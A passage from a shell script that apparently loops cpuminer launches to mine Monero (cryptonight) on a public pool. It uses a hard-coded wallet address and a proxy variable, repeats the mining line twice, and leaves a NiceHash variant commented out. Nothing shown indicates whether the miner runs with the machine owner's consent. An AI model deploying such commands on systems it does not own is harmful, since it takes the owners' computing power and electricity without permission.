...
#	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 444au7vc1LAKR3r9RcAhwM7Sj5P98fuojbiqN8GESRndLKGbnX6Jjz7YgqihqTjUZ73GkzVrpC4FdT95sCat51ph1oRrSYE -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 444au7vc1LAKR3r9RcAhwM7Sj5P98fuojbiqN8GESRndLKGbnX6Jjz7YgqihqTjUZ73GkzVrpC4FdT95sCat51ph1oRrSYE -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
done
